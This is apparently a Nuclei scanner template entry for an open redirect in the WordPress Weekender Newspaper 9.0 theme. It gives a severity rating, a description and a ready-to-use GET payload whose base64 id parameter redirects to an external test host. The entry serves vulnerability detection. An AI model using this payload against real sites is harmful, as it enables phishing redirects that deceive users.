# Nuclei Template: WordPress Weekender Newspaper 9.0 - Open Redirect
**Template ID:** weekender-newspaper-open-redirect
**Vulnerability Class:** Open Redirect
**Severity:** Medium
**CWE:** CWE-601
**Source:** Nuclei Template (`weekender-newspaper-open-redirect.yaml`)

## Vulnerability Information & PoC

## Description
WordPress Weekender Newspaper theme 9.0 contains an open redirect vulnerability. An attacker can redirect a user to a malicious site and possibly obtain sensitive information, modify data, and/or execute unauthorized operations.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/themes/weekender/friend.php?id=aHR0cHM6Ly9pbnRlcmFjdC5zaA==
```

## References
- https://cxsecurity.com/issue/WLB-2020040103
